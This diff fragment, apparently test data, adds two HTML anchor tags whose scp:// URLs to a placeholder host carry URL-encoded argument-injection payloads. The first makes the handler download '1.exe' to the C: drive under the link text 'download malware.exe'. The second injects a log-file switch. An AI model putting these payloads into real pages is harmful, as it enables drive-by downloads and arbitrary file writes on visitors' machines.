@@ -1,0 +1,2 @@
+&lt;a href=&quot;scp://user:password@www.example.com:22/%22%20/console%20/command%20%22lcd%20c:\%22%20%22get%201.exe%22%20exit&quot;&gt;download malware.exe&lt;/a&gt;
+&lt;a href=&quot;scp://jelmer@www.example.com:22/%22%20%22/log=c:%5csomefile%22&quot;log&lt;/a&gt;
